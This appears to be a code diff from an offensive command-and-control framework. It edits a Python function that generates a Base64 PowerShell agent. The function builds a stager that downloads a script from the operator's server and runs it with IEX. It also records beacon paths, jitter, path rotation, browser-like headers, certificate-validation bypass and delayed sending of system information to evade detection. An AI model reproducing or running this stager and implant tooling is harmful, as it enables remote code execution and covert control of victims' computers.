@@ -147,7 +147,7 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         max_backoff=max_backoff
     )
     
-    # Create the Base64 stager
+    # Create the Base64 stager with improved security for first contact
     stager_path = url_paths["stager_path"]
     base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{server_address}{stager_path}');IEX($S)"
     
@@ -180,8 +180,8 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     details = (
         f"Powershell Base64 Agent Details:\n"
         f"1. Base Command: {powershell_command}\n"
-        f"2. Encryption: Dynamic key exchange (no hardcoded key)\n"
-        f"3. System Identification: Simplified (hostname and IP only)\n"
+        f"2. Encryption: Dynamic key exchange with secure first contact\n"
+        f"3. System Identification: Sent only after secure channel established\n"
         f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
         f"5. Communication Paths:\n"
         f"   - Beacon URL: {http}://{server_address}{url_paths['beacon_path']}\n"
@@ -191,7 +191,8 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         f"6. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
         f"7. Headers: Legitimate web browsing headers included\n"
         f"8. Error Handling: Enhanced error reporting enabled\n"
-        f"9. Beacon Configuration:\n"
+        f"9. First Contact Security: Minimal data sent until encryption established\n"
+        f"10. Beacon Configuration:\n"
         f"   - Interval: {beacon_interval} seconds\n" 
         f"   - Jitter: {jitter_percentage}%\n"
         f"   - Path Rotation: {'Enabled' if rotation_enabled else 'Disabled'}\n"
@@ -203,7 +204,7 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     with open(details_file_path, 'w') as f:
         f.write(details)
     
-    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: Dynamic key exchange (no hardcoded key)\nIdentity: Simple hostname and IP identification"
+    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: Dynamic key exchange with secure first contact\nSecurity: No system information sent until encrypted channel established"
     
     return f"Powershell Base64 agent generated and saved to {details_file_path}\n{result}"
 
